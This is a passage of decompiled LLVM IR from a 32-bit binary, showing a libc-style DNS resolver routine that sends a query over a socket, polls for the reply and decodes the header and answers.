  store i32 %v1_8057614, i32* %v3_8057619, align 4
  %v0_8057620 = load i32, i32* @esp, align 4
  %v1_8057620 = add i32 %v0_8057620, 16
  br label %dec_label_pc_8057623

dec_label_pc_8057623:                             ; preds = %dec_label_pc_80575ec, %dec_label_pc_8057603
  %v1_8057623 = phi i32 [ %v1_8057620, %dec_label_pc_8057603 ], [ %v0_805760d, %dec_label_pc_80575ec ]
  %v0_8057623 = load i32, i32* @ecx, align 4
  %v2_8057623 = add i32 %v1_8057623, -4
  %v3_8057623 = inttoptr i32 %v2_8057623 to i32*
  store i32 %v0_8057623, i32* %v3_8057623, align 4
  %v1_8057624 = add i32 %v1_8057623, -8
  %v2_8057624 = inttoptr i32 %v1_8057624 to i32*
  store i32 17, i32* %v2_8057624, align 4
  %v1_8057626 = add i32 %v1_8057623, -12
  %v2_8057626 = inttoptr i32 %v1_8057626 to i32*
  store i32 2, i32* %v2_8057626, align 4
  %v1_8057628 = add i32 %v1_8057623, 156
  %v2_8057628 = inttoptr i32 %v1_8057628 to i16*
  %v3_8057628 = load i16, i16* %v2_8057628, align 2
  %v4_8057628 = zext i16 %v3_8057628 to i32
  store i32 %v4_8057628, i32* %eax.global-to-local, align 4
  %v2_8057630 = add i32 %v1_8057623, -16
  %v3_8057630 = inttoptr i32 %v2_8057630 to i32*
  store i32 %v4_8057628, i32* %v3_8057630, align 4
  %v4_8057631 = call i32 @socket(i32 -1, i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v4_8057631, i32* %eax.global-to-local, align 4
  %v1_8057636 = load i32, i32* @esp, align 4
  %v2_8057636 = add i32 %v1_8057636, 36
  %v3_8057636 = inttoptr i32 %v2_8057636 to i32*
  store i32 %v4_8057631, i32* %v3_8057636, align 4
  %v0_805763a = load i32, i32* @esp, align 4
  %v1_805763a = add i32 %v0_805763a, 16
  %v0_805763d = load i32, i32* %eax.global-to-local, align 4
  %v2_805763d = icmp slt i32 %v0_805763d, 0
  br i1 %v2_805763d, label %dec_label_pc_805766a, label %dec_label_pc_8057641

dec_label_pc_8057641:                             ; preds = %dec_label_pc_8057623
  %v1_8057641 = add i32 %v0_805763a, 172
  store i32 %v1_8057641, i32* %eax.global-to-local, align 4
  %v0_8057648 = load i32, i32* @edx, align 4
  %v2_8057648 = add i32 %v0_805763a, 12
  %v3_8057648 = inttoptr i32 %v2_8057648 to i32*
  store i32 %v0_8057648, i32* %v3_8057648, align 4
  %v1_8057649 = add i32 %v0_805763a, 8
  %v2_8057649 = inttoptr i32 %v1_8057649 to i32*
  store i32 28, i32* %v2_8057649, align 4
  %v0_805764b = load i32, i32* %eax.global-to-local, align 4
  %v2_805764b = add i32 %v0_805763a, 4
  %v3_805764b = inttoptr i32 %v2_805764b to i32*
  store i32 %v0_805764b, i32* %v3_805764b, align 4
  %v1_805764c = add i32 %v0_805763a, 36
  %v2_805764c = inttoptr i32 %v1_805764c to i32*
  %v3_805764c = load i32, i32* %v2_805764c, align 4
  %v6_805764c = inttoptr i32 %v0_805763a to i32*
  store i32 %v3_805764c, i32* %v6_805764c, align 4
  %v4_8057650 = call i32 @__libc_connect(i32 -1, i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v4_8057650, i32* %eax.global-to-local, align 4
  %v0_8057655 = load i32, i32* @esp, align 4
  %v2_8057658 = icmp slt i32 %v4_8057650, 0
  %v1_805765a = icmp eq i1 %v2_8057658, false
  br i1 %v1_805765a, label %dec_label_pc_8057673, label %dec_label_pc_805765c

dec_label_pc_805765c:                             ; preds = %dec_label_pc_8057641
  %v1_805765c = call i32 @__errno_location(i32 -1)
  store i32 %v1_805765c, i32* %eax.global-to-local, align 4
  %v1_8057661 = inttoptr i32 %v1_805765c to i32*
  %v2_8057661 = load i32, i32* %v1_8057661, align 4
  %v11_8057661 = icmp eq i32 %v2_8057661, 101
  %v0_80579d3.pre = load i32, i32* @esp, align 4
  br i1 %v11_8057661, label %dec_label_pc_80579d3, label %dec_label_pc_805766a

dec_label_pc_805766a:                             ; preds = %dec_label_pc_805765c, %dec_label_pc_8057623
  %v17_805766a = phi i32 [ %v1_805763a, %dec_label_pc_8057623 ], [ %v0_80579d3.pre, %dec_label_pc_805765c ]
  %v1_805766a = add i32 %v17_805766a, 28
  %v2_805766a = inttoptr i32 %v1_805766a to i32*
  %v3_805766a = load i32, i32* %v2_805766a, align 4
  %v4_805766a = add i32 %v3_805766a, 1
  store i32 %v4_805766a, i32* %v2_805766a, align 4
  br label %dec_label_pc_80579f4.backedge

dec_label_pc_8057673:                             ; preds = %dec_label_pc_8057641
  %v0_8057673 = load i32, i32* @ebx, align 4
  %v1_8057673 = load i32, i32* @esi, align 4
  %v2_8057673 = add i32 %v1_8057673, %v0_8057673
  store i32 %v2_8057673, i32* %eax.global-to-local, align 4
  %v1_8057676 = add i32 %v0_8057655, 12
  %v2_8057676 = inttoptr i32 %v1_8057676 to i32*
  store i32 0, i32* %v2_8057676, align 4
  %v0_8057678 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057678 = add i32 %v0_8057655, 8
  %v3_8057678 = inttoptr i32 %v2_8057678 to i32*
  store i32 %v0_8057678, i32* %v3_8057678, align 4
  %v2_8057679 = add i32 %v0_8057655, 4
  %v3_8057679 = inttoptr i32 %v2_8057679 to i32*
  store i32 %v2_8057386, i32* %v3_8057679, align 4
  %v1_805767a = add i32 %v0_8057655, 36
  %v2_805767a = inttoptr i32 %v1_805767a to i32*
  %v3_805767a = load i32, i32* %v2_805767a, align 4
  %v6_805767a = inttoptr i32 %v0_8057655 to i32*
  store i32 %v3_805767a, i32* %v6_805767a, align 4
  %v5_805767e = call i32 @__libc_send(i32 -1, i32 %v15_8057414, i32 %v3_8057473, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805767e, i32* %eax.global-to-local, align 4
  %v0_8057683 = load i32, i32* @esp, align 4
  %v1_8057683 = add i32 %v0_8057683, 36
  %v2_8057683 = inttoptr i32 %v1_8057683 to i32*
  %v3_8057683 = load i32, i32* %v2_8057683, align 4
  %v2_8057687 = add i32 %v0_8057683, 228
  %v3_8057687 = inttoptr i32 %v2_8057687 to i32*
  store i32 %v3_8057683, i32* %v3_8057687, align 4
  %v0_805768e = load i32, i32* @esp, align 4
  %v1_805768e = add i32 %v0_805768e, 232
  %v2_805768e = inttoptr i32 %v1_805768e to i16*
  store i16 1, i16* %v2_805768e, align 2
  %v0_8057698 = load i32, i32* @esp, align 4
  %v1_805769b = add i32 %v0_8057698, 8
  %v2_805769b = inttoptr i32 %v1_805769b to i32*
  store i32 10000, i32* %v2_805769b, align 4
  %v1_80576a0 = add i32 %v0_8057698, 4
  %v2_80576a0 = inttoptr i32 %v1_80576a0 to i32*
  store i32 1, i32* %v2_80576a0, align 4
  %v1_80576a2 = add i32 %v0_8057698, 228
  store i32 %v1_80576a2, i32* %eax.global-to-local, align 4
  %v3_80576a9 = inttoptr i32 %v0_8057698 to i32*
  store i32 %v1_80576a2, i32* %v3_80576a9, align 4
  %v0_80576aa = call i32 @__libc_poll()
  store i32 %v0_80576aa, i32* %eax.global-to-local, align 4
  %v0_80576af = load i32, i32* @esp, align 4
  %v1_80576af = add i32 %v0_80576af, 16
  %tmp52 = icmp slt i32 %v0_80576aa, 1
  br i1 %tmp52, label %dec_label_pc_80579d3, label %dec_label_pc_80576ba

dec_label_pc_80576ba:                             ; preds = %dec_label_pc_8057673
  %v1_80576ba = add i32 %v0_80576af, 12
  %v2_80576ba = inttoptr i32 %v1_80576ba to i32*
  store i32 0, i32* %v2_80576ba, align 4
  %v1_80576bc = add i32 %v0_80576af, 8
  %v2_80576bc = inttoptr i32 %v1_80576bc to i32*
  store i32 512, i32* %v2_80576bc, align 4
  %v2_80576c1 = add i32 %v0_80576af, 4
  %v3_80576c1 = inttoptr i32 %v2_80576c1 to i32*
  store i32 %v2_8057386, i32* %v3_80576c1, align 4
  %v1_80576c2 = add i32 %v0_80576af, 36
  %v2_80576c2 = inttoptr i32 %v1_80576c2 to i32*
  %v3_80576c2 = load i32, i32* %v2_80576c2, align 4
  %v6_80576c2 = inttoptr i32 %v0_80576af to i32*
  store i32 %v3_80576c2, i32* %v6_80576c2, align 4
  %v5_80576c6 = call i32 @__libc_recv(i32 -1, i32 %v15_8057414, i32 %v3_8057473, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80576c6, i32* %eax.global-to-local, align 4
  %v1_80576cb = load i32, i32* @esp, align 4
  %v2_80576cb = add i32 %v1_80576cb, 32
  %v3_80576cb = inttoptr i32 %v2_80576cb to i32*
  store i32 %v5_80576c6, i32* %v3_80576cb, align 4
  %v0_80576cf = load i32, i32* @esp, align 4
  %v1_80576cf = add i32 %v0_80576cf, 16
  %v7_80576d5 = icmp sgt i32 %v5_80576c6, 11
  br i1 %v7_80576d5, label %dec_label_pc_80576db, label %dec_label_pc_8057988

dec_label_pc_80576db:                             ; preds = %dec_label_pc_80576ba
  %v0_80576db = load i32, i32* @ebx, align 4
  %v2_80576db = add i32 %v0_80576cf, 12
  %v3_80576db = inttoptr i32 %v2_80576db to i32*
  store i32 %v0_80576db, i32* %v3_80576db, align 4
  %v0_80576dc = load i32, i32* @ebx, align 4
  %v2_80576dc = add i32 %v0_80576cf, 8
  %v3_80576dc = inttoptr i32 %v2_80576dc to i32*
  store i32 %v0_80576dc, i32* %v3_80576dc, align 4
  %v1_80576dd = add i32 %v0_80576cf, 84
  store i32 %v1_80576dd, i32* %eax.global-to-local, align 4
  %v2_80576e1 = add i32 %v0_80576cf, 4
  %v3_80576e1 = inttoptr i32 %v2_80576e1 to i32*
  store i32 %v1_80576dd, i32* %v3_80576e1, align 4
  %v3_80576e2 = inttoptr i32 %v0_80576cf to i32*
  store i32 %v2_8057386, i32* %v3_80576e2, align 4
  %v0_80576e3 = call i32 @__decode_header()
  store i32 %v0_80576e3, i32* %eax.global-to-local, align 4
  %v0_80576e8 = load i32, i32* @esp, align 4
  %v1_80576e8 = add i32 %v0_80576e8, 84
  %v2_80576e8 = inttoptr i32 %v1_80576e8 to i32*
  %v3_80576e8 = load i32, i32* %v2_80576e8, align 4
  store i32 %v3_80576e8, i32* %edx.global-to-local, align 4
  %v2_80576ec = add i32 %v0_80576e8, 72
  %v3_80576ec = inttoptr i32 %v2_80576ec to i32*
  store i32 %v3_80576e8, i32* %v3_80576ec, align 4
  %v0_80576f0 = load i32, i32* @esp, align 4
  %v1_80576f0 = add i32 %v0_80576f0, 16
  %v1_80576f3 = add i32 %v0_80576f0, 60
  %v2_80576f3 = inttoptr i32 %v1_80576f3 to i32*
  %v3_80576f3 = load i32, i32* %v2_80576f3, align 4
  store i32 %v3_80576f3, i32* %eax.global-to-local, align 4
  %v0_80576f7 = load i32, i32* %edx.global-to-local, align 4
  %v12_80576f7 = icmp eq i32 %v0_80576f7, %v3_80576f3
  %v1_80576f9 = icmp eq i1 %v12_80576f7, false
  br i1 %v1_80576f9, label %dec_label_pc_8057988, label %dec_label_pc_80576ff

dec_label_pc_80576ff:                             ; preds = %dec_label_pc_80576db
  %v1_80576ff = add i32 %v0_80576f0, 88
  %v2_80576ff = inttoptr i32 %v1_80576ff to i32*
  %v3_80576ff = load i32, i32* %v2_80576ff, align 4
  %v4_80576ff = icmp eq i32 %v3_80576ff, 0
  br i1 %v4_80576ff, label %dec_label_pc_8057988, label %dec_label_pc_805770a

dec_label_pc_805770a:                             ; preds = %dec_label_pc_80576ff
  %v1_805770a = add i32 %v0_80576f0, 112
  %v2_805770a = inttoptr i32 %v1_805770a to i32*
  %v3_805770a = load i32, i32* %v2_805770a, align 4
  store i32 %v3_805770a, i32* %eax.global-to-local, align 4
  %v9_805770e = icmp eq i32 %v3_805770a, 3
  %v1_8057711 = icmp eq i1 %v9_805770e, false
  br i1 %v1_8057711, label %dec_label_pc_8057779, label %dec_label_pc_8057713

dec_label_pc_8057713:                             ; preds = %dec_label_pc_805770a
  %v1_8057713 = add i32 %v0_80576f0, 67
  %v2_8057713 = inttoptr i32 %v1_8057713 to i8*
  %v3_8057713 = load i8, i8* %v2_8057713, align 1
  %v4_8057713 = icmp eq i8 %v3_8057713, 0
  %v1_8057718 = icmp eq i1 %v4_8057713, false
  br i1 %v1_8057718, label %dec_label_pc_8057769, label %dec_label_pc_805771a

dec_label_pc_805771a:                             ; preds = %dec_label_pc_8057713
  %v0_805771a = load i32, i32* @ecx, align 4
  %v2_805771a = add i32 %v0_80576f0, 12
  %v3_805771a = inttoptr i32 %v2_805771a to i32*
  store i32 %v0_805771a, i32* %v3_805771a, align 4
  %v1_805771b = add i32 %v0_80576f0, 8
  %v2_805771b = inttoptr i32 %v1_805771b to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v2_805771b, align 4
  %v1_8057720 = add i32 %v0_80576f0, 4
  %v2_8057720 = inttoptr i32 %v1_8057720 to i32*
  store i32 134540701, i32* %v2_8057720, align 4
  %v1_8057725 = add i32 %v0_80576f0, 200
  store i32 %v1_8057725, i32* @esi, align 4
  %v3_805772c = inttoptr i32 %v0_80576f0 to i32*
  store i32 %v1_8057725, i32* %v3_805772c, align 4
  %v5_805772d = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_805772d, i32* %eax.global-to-local, align 4
  %v0_8057732 = load i32, i32* @esp, align 4
  %v1_8057732 = inttoptr i32 %v0_8057732 to i32*
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %v1_8057732, align 4
  %v1_8057739 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057739, i32* %eax.global-to-local, align 4
  %v0_805773e = load i32, i32* @esp, align 4
  %v1_805773e = inttoptr i32 %v0_805773e to i32*
  %v2_805773e = load i32, i32* %v1_805773e, align 4
  store i32 %v2_805773e, i32* %eax.global-to-local, align 4
  %v3_805773e = add i32 %v0_805773e, 4
  %v1_805773f = inttoptr i32 %v3_805773e to i32*
  %v2_805773f = load i32, i32* %v1_805773f, align 4
  store i32 %v2_805773f, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805773f, align 4
  %v0_8057742 = load i32, i32* @esi, align 4
  store i32 %v0_8057742, i32* %v1_805773e, align 4
  %v0_8057743 = load i32, i32* @global_var_8067ac4.319, align 4
  store i32 %v0_8057743, i32* @ebx, align 4
  %v3_8057749 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8057414)
  store i32 %v3_8057749, i32* %eax.global-to-local, align 4
  %v0_805774e = load i32, i32* @esp, align 4
  %v0_8057751 = load i32, i32* @ebx, align 4
  %v1_8057751 = add i32 %v0_8057751, -1
  store i32 %v1_8057751, i32* @ebx, align 4
  %v1_8057752 = add i32 %v0_805774e, 52
  %v2_8057752 = inttoptr i32 %v1_8057752 to i32*
  %v3_8057752 = load i32, i32* %v2_8057752, align 4
  %v5_8057752 = sub i32 %v3_8057752, %v1_8057751
  %v11_8057752 = xor i32 %v3_8057752, %v1_8057751
  %v12_8057752 = xor i32 %v5_8057752, %v3_8057752
  %v13_8057752 = and i32 %v12_8057752, %v11_8057752
  %v14_8057752 = icmp slt i32 %v13_8057752, 0
  %v16_8057752 = icmp slt i32 %v5_8057752, 0
  %v2_8057756 = icmp eq i1 %v16_8057752, %v14_8057752
  br i1 %v2_8057756, label %dec_label_pc_8057769, label %dec_label_pc_8057758

dec_label_pc_8057758:                             ; preds = %dec_label_pc_805771a
  %v4_8057758 = add i32 %v3_8057752, 1
  store i32 %v4_8057758, i32* %v2_8057752, align 4
  %v0_805775c = load i32, i32* @esp, align 4
  %v1_805775c = add i32 %v0_805775c, 56
  %v2_805775c = inttoptr i32 %v1_805775c to i32*
  %v3_805775c = load i32, i32* %v2_805775c, align 4
  store i32 %v3_805775c, i32* %edx.global-to-local, align 4
  %v2_8057760 = add i32 %v0_805775c, 44
  %v3_8057760 = inttoptr i32 %v2_8057760 to i32*
  store i32 %v3_805775c, i32* %v3_8057760, align 4
  br label %dec_label_pc_80579f4.backedge

dec_label_pc_8057769:                             ; preds = %dec_label_pc_805771a, %dec_label_pc_8057713
  %v0_8057769 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057769, i32* %eax.global-to-local, align 4
  %v1_805776e = inttoptr i32 %v0_8057769 to i32*
  store i32 1, i32* %v1_805776e, align 4
  br label %dec_label_pc_8057a2c

dec_label_pc_8057779:                             ; preds = %dec_label_pc_805770a
  %v1_8057779 = icmp eq i32 %v3_805770a, 0
  %v1_805777b = icmp eq i1 %v1_8057779, false
  br i1 %v1_805777b, label %dec_label_pc_8057988, label %dec_label_pc_8057781

dec_label_pc_8057781:                             ; preds = %dec_label_pc_8057779
  %v1_8057781 = add i32 %v0_80576f0, 120
  %v2_8057781 = inttoptr i32 %v1_8057781 to i32*
  %v3_8057781 = load i32, i32* %v2_8057781, align 4
  %tmp53 = icmp slt i32 %v3_8057781, 1
  br i1 %tmp53, label %dec_label_pc_8057791, label %dec_label_pc_8057788

dec_label_pc_8057788:                             ; preds = %dec_label_pc_8057781
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_80577b059 = add i32 %v0_80576f0, 116
  %v3_80577b060 = inttoptr i32 %v2_80577b059 to i32*
  %v4_80577b061 = load i32, i32* %v3_80577b060, align 4
  %v5_80577b062 = sub i32 0, %v4_80577b061
  %v13_80577b066 = and i32 %v4_80577b061, %v5_80577b062
  %v14_80577b067 = icmp slt i32 %v13_80577b066, 0
  %v16_80577b069 = icmp slt i32 %v5_80577b062, 0
  %v2_80577b470 = icmp eq i1 %v16_80577b069, %v14_80577b067
  br i1 %v2_80577b470, label %dec_label_pc_80577b6, label %dec_label_pc_80577a1

dec_label_pc_8057791:                             ; preds = %dec_label_pc_8057781
  %v0_8057791 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057791, i32* %eax.global-to-local, align 4
  %v1_8057796 = inttoptr i32 %v0_8057791 to i32*
  store i32 4, i32* %v1_8057796, align 4
  br label %dec_label_pc_8057a2c

dec_label_pc_80577a1:                             ; preds = %dec_label_pc_8057788, %dec_label_pc_80577a1
  %v0_80577b872 = phi i32 [ %v1_80577ad, %dec_label_pc_80577a1 ], [ %v1_80576f0, %dec_label_pc_8057788 ]
  %v0_80577a171 = phi i32 [ %v0_80577a5, %dec_label_pc_80577a1 ], [ %v3_805770a, %dec_label_pc_8057788 ]
  %v2_80577a1 = add i32 %v0_80577b872, -4
  %v3_80577a1 = inttoptr i32 %v2_80577a1 to i32*
  store i32 %v0_80577a171, i32* %v3_80577a1, align 4
  %v0_80577a2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80577a2 = add i32 %v0_80577b872, -8
  %v3_80577a2 = inttoptr i32 %v2_80577a2 to i32*
  store i32 %v0_80577a2, i32* %v3_80577a2, align 4
  %v0_80577a3 = load i32, i32* @esi, align 4
  %v2_80577a3 = add i32 %v0_80577b872, -12
  %v3_80577a3 = inttoptr i32 %v2_80577a3 to i32*
  store i32 %v0_80577a3, i32* %v3_80577a3, align 4
  %v2_80577a4 = add i32 %v0_80577b872, -16
  %v3_80577a4 = inttoptr i32 %v2_80577a4 to i32*
  store i32 %v2_8057386, i32* %v3_80577a4, align 4
  %v0_80577a5 = call i32 @__length_question()
  store i32 %v0_80577a5, i32* %eax.global-to-local, align 4
  %v0_80577aa = load i32, i32* @ebx, align 4
  %v1_80577aa = add i32 %v0_80577aa, 1
  store i32 %v1_80577aa, i32* @ebx, align 4
  %v0_80577ab = load i32, i32* @esi, align 4
  %v2_80577ab = add i32 %v0_80577ab, %v0_80577a5
  store i32 %v2_80577ab, i32* @esi, align 4
  %v0_80577ad = load i32, i32* @esp, align 4
  %v1_80577ad = add i32 %v0_80577ad, 16
  %v2_80577b0 = add i32 %v0_80577ad, 116
  %v3_80577b0 = inttoptr i32 %v2_80577b0 to i32*
  %v4_80577b0 = load i32, i32* %v3_80577b0, align 4
  %v5_80577b0 = sub i32 %v1_80577aa, %v4_80577b0
  %v11_80577b0 = xor i32 %v4_80577b0, %v1_80577aa
  %v12_80577b0 = xor i32 %v5_80577b0, %v1_80577aa
  %v13_80577b0 = and i32 %v12_80577b0, %v11_80577b0
  %v14_80577b0 = icmp slt i32 %v13_80577b0, 0
  %v16_80577b0 = icmp slt i32 %v5_80577b0, 0
  %v2_80577b4 = icmp eq i1 %v16_80577b0, %v14_80577b0
  br i1 %v2_80577b4, label %dec_label_pc_80577b6, label %dec_label_pc_80577a1

dec_label_pc_80577b6:                             ; preds = %dec_label_pc_80577a1, %dec_label_pc_8057788
  %v0_80577b8.lcssa = phi i32 [ %v1_80576f0, %dec_label_pc_8057788 ], [ %v1_80577ad, %dec_label_pc_80577a1 ]
  store i32 0, i32* @ebx, align 4
  %v1_80577b8 = add i32 %v0_80577b8.lcssa, 27
  %v2_80577b8 = inttoptr i32 %v1_80577b8 to i8*
  store i8 1, i8* %v2_80577b8, align 1
  %v0_80578e6.pre = load i32, i32* @ebx, align 4
  %v1_80578e6.pre = load i32, i32* @esp, align 4
  %v2_80578e673 = add i32 %v1_80578e6.pre, 104
  %v3_80578e674 = inttoptr i32 %v2_80578e673 to i32*
  %v4_80578e675 = load i32, i32* %v3_80578e674, align 4
  %v5_80578e676 = sub i32 %v0_80578e6.pre, %v4_80578e675
  %v11_80578e678 = xor i32 %v4_80578e675, %v0_80578e6.pre
  %v12_80578e679 = xor i32 %v5_80578e676, %v0_80578e6.pre
  %v13_80578e680 = and i32 %v12_80578e679, %v11_80578e678
  %v14_80578e681 = icmp slt i32 %v13_80578e680, 0
  %v16_80578e683 = icmp slt i32 %v5_80578e676, 0
  %v2_80578ea84 = icmp eq i1 %v16_80578e683, %v14_80578e681
  br i1 %v2_80578ea84, label %dec_label_pc_80578f6, label %dec_label_pc_80578ec.lr.ph

dec_label_pc_80578ec.lr.ph:                       ; preds = %dec_label_pc_80577b6
  %v0_80578ec.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80578ec

dec_label_pc_80577c2:                             ; preds = %dec_label_pc_80578ec
  %v1_80577c2 = add i32 %v0_80577c285, 116
  store i32 %v1_80577c2, i32* %eax.global-to-local, align 4
  %v2_80577c6 = add i32 %v0_80577c285, -4
  %v3_80577c6 = inttoptr i32 %v2_80577c6 to i32*
  store i32 %v1_80577c2, i32* %v3_80577c6, align 4
  %v3_80577c7 = load i32, i32* %v3_80578ec, align 4
  %v5_80577c7 = add i32 %v0_80577c285, -8
  %v6_80577c7 = inttoptr i32 %v5_80577c7 to i32*
  store i32 %v3_80577c7, i32* %v6_80577c7, align 4
  %v0_80577cb = load i32, i32* @esi, align 4
  %v2_80577cb = add i32 %v0_80577c285, -12
  %v3_80577cb = inttoptr i32 %v2_80577cb to i32*
  store i32 %v0_80577cb, i32* %v3_80577cb, align 4
  %v2_80577cc = add i32 %v0_80577c285, -16
  %v3_80577cc = inttoptr i32 %v2_80577cc to i32*
  store i32 %v2_8057386, i32* %v3_80577cc, align 4
  %v0_80577cd = call i32 @__decode_answer()
  store i32 %v0_80577cd, i32* %eax.global-to-local, align 4
  %v1_80577d2 = load i32, i32* @esp, align 4
  %v2_80577d2 = add i32 %v1_80577d2, 68
  %v3_80577d2 = inttoptr i32 %v2_80577d2 to i32*
  store i32 %v0_80577cd, i32* %v3_80577d2, align 4
  %v0_80577d6 = load i32, i32* @esp, align 4
  %v1_80577d6 = add i32 %v0_80577d6, 16
  %v2_80577d9 = icmp slt i32 %v0_80577cd, 0
  %v1_80577db = icmp eq i1 %v2_80577d9, false
  br i1 %v1_80577db, label %dec_label_pc_80577f5, label %dec_label_pc_80577dd

dec_label_pc_80577dd:                             ; preds = %dec_label_pc_80577c2
  %v0_80577dd = load i32, i32* @ebx, align 4
  %v1_80577dd = icmp eq i32 %v0_80577dd, 0
  br i1 %v1_80577dd, label %dec_label_pc_8057988, label %dec_label_pc_80577e5

dec_label_pc_80577e5:                             ; preds = %dec_label_pc_80577dd
  %v1_80577e5 = add i32 %v0_80577d6, 100
  %v2_80577e5 = inttoptr i32 %v1_80577e5 to i32*
  %v3_80577e5 = load i32, i32* %v2_80577e5, align 4
  %v4_80577e5 = icmp eq i32 %v3_80577e5, 0
  br i1 %v4_80577e5, label %dec_label_pc_8057988, label %dec_label_pc_80578f6

dec_label_pc_80577f5:                             ; preds = %dec_label_pc_80577c2
  %v1_80577f5 = add i32 %v0_80577d6, 43
  %v2_80577f5 = inttoptr i32 %v1_80577f5 to i8*
  %v3_80577f5 = load i8, i8* %v2_80577f5, align 1
  %v4_80577f5 = icmp eq i8 %v3_80577f5, 0
  br i1 %v4_80577f5, label %dec_label_pc_8057896, label %dec_label_pc_8057800

dec_label_pc_8057800:                             ; preds = %dec_label_pc_80577f5
  %v0_8057800 = load i32, i32* @edi, align 4
  %v1_8057800 = add i32 %v0_8057800, 28
  %v2_8057800 = inttoptr i32 %v1_8057800 to i32*
  %v3_8057800 = load i32, i32* %v2_8057800, align 4
  store i32 %v3_8057800, i32* %eax.global-to-local, align 4
  %v2_8057803 = add i32 %v0_80577d6, 160
  %v3_8057803 = inttoptr i32 %v2_8057803 to i32*
  store i32 %v3_8057800, i32* %v3_8057803, align 4
  %v0_805780a = load i32, i32* @edi, align 4
  %v1_805780a = add i32 %v0_805780a, 32
  %v2_805780a = inttoptr i32 %v1_805780a to i32*
  %v3_805780a = load i32, i32* %v2_805780a, align 4
  store i32 %v3_805780a, i32* %eax.global-to-local, align 4
  %v1_805780d = load i32, i32* @esp, align 4
  %v2_805780d = add i32 %v1_805780d, 148
  %v3_805780d = inttoptr i32 %v2_805780d to i32*
  store i32 %v3_805780a, i32* %v3_805780d, align 4
  %v0_8057814 = load i32, i32* @edi, align 4
  %v1_8057814 = add i32 %v0_8057814, 36
  %v2_8057814 = inttoptr i32 %v1_8057814 to i32*
  %v3_8057814 = load i32, i32* %v2_8057814, align 4
  store i32 %v3_8057814, i32* %eax.global-to-local, align 4
  %v1_8057817 = load i32, i32* @esp, align 4
  %v2_8057817 = add i32 %v1_8057817, 152
  %v3_8057817 = inttoptr i32 %v2_8057817 to i32*
  store i32 %v3_8057814, i32* %v3_8057817, align 4
  %v0_805781e = load i32, i32* @ecx, align 4
  %v1_805781e = load i32, i32* @esp, align 4
  %v2_805781e = add i32 %v1_805781e, -4
  %v3_805781e = inttoptr i32 %v2_805781e to i32*
  store i32 %v0_805781e, i32* %v3_805781e, align 4
  %v1_805781f = add i32 %v1_805781e, -8
  %v2_805781f = inttoptr i32 %v1_805781f to i32*
  store i32 40, i32* %v2_805781f, align 4
  %v1_8057821 = add i32 %v1_805781e, 116
  store i32 %v1_8057821, i32* %edx.global-to-local, align 4
  %v2_8057825 = add i32 %v1_805781e, -12
  %v3_8057825 = inttoptr i32 %v2_8057825 to i32*
  store i32 %v1_8057821, i32* %v3_8057825, align 4
  %v0_8057826 = load i32, i32* @edi, align 4
  %v2_8057826 = add i32 %v1_805781e, -16
  %v3_8057826 = inttoptr i32 %v2_8057826 to i32*
  store i32 %v0_8057826, i32* %v3_8057826, align 4
  %v5_8057827 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8057414, i32 %v3_8057473)
  store i32 %v5_8057827, i32* %eax.global-to-local, align 4
  %v0_805782c = load i32, i32* @edi, align 4
  %v1_805782c = add i32 %v0_805782c, 4
  %v2_805782c = inttoptr i32 %v1_805782c to i32*
  %v3_805782c = load i32, i32* %v2_805782c, align 4
  store i32 %v3_805782c, i32* %eax.global-to-local, align 4
  %v0_805782f = load i32, i32* @esp, align 4
  %v1_805782f = add i32 %v0_805782f, 16
  %v9_8057832 = icmp eq i32 %v3_805782c, 24
  br i1 %v9_8057832, label %dec_label_pc_8057800.dec_label_pc_8057859_crit_edge, label %dec_label_pc_8057837

dec_label_pc_8057800.dec_label_pc_8057859_crit_edge: ; preds = %dec_label_pc_8057800
  %.pre28 = add i32 %v0_805782f, 260
  %.pre29 = inttoptr i32 %.pre28 to i32*
  %v4_8057859.pre = load i32, i32* %.pre29, align 4
  br label %dec_label_pc_8057859

dec_label_pc_8057837:                             ; preds = %dec_label_pc_8057800
  %v1_8057837 = add i32 %v0_805782c, 28
  %v2_8057837 = inttoptr i32 %v1_8057837 to i32*
  %v3_8057837 = load i32, i32* %v2_8057837, align 4
  %v4_8057837 = icmp eq i32 %v3_8057837, 0
  br i1 %v4_8057837, label %dec_label_pc_80578f6, label %dec_label_pc_8057841

dec_label_pc_8057841:                             ; preds = %dec_label_pc_8057837
  %v1_8057841 = add i32 %v0_805782f, 260
  %v2_8057841 = inttoptr i32 %v1_8057841 to i32*
  %v3_8057841 = load i32, i32* %v2_8057841, align 4
  %v12_8057841 = icmp eq i32 %v3_8057841, 1
  br i1 %v12_8057841, label %dec_label_pc_8057859, label %dec_label_pc_805784b

dec_label_pc_805784b:                             ; preds = %dec_label_pc_8057841
  %v12_805784b = icmp eq i32 %v3_8057841, 28
  %v1_8057853 = icmp eq i1 %v12_805784b, false
  br i1 %v1_8057853, label %dec_label_pc_80578f6, label %dec_label_pc_8057859

dec_label_pc_8057859:                             ; preds = %dec_label_pc_8057800.dec_label_pc_8057859_crit_edge, %dec_label_pc_805784b, %dec_label_pc_8057841
  %v4_8057859 = phi i32 [ %v4_8057859.pre, %dec_label_pc_8057800.dec_label_pc_8057859_crit_edge ], [ %v3_8057841, %dec_label_pc_805784b ], [ 1, %dec_label_pc_8057841 ]
  %v15_8057859 = icmp eq i32 %v3_805782c, %v4_8057859
  br i1 %v15_8057859, label %dec_label_pc_805786e, label %dec_label_pc_8057862

dec_label_pc_8057862:                             ; preds = %dec_label_pc_8057859
  %v1_8057865 = inttoptr i32 %v0_805782c to i32*
